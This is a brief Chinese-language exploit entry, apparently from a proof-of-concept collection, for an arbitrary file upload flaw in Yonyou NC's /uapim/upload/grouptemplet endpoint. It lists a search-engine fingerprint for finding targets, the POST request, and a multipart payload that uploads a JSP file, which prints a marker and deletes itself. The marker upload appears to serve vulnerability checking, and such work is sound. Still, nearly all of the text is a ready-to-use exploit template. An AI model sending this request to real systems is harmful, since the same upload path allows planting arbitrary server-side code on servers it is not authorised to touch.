# 用友NCuapim任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /uapim/upload/grouptemplet?groupid=dudesuite&fileType=jsp HTTP/1.1`

**Payload**
```
--97jkbhjvvyhvhvuyvug97
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
<% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--97jkbhjvvyhvhvuyvug97--
```
- **响应特征**：200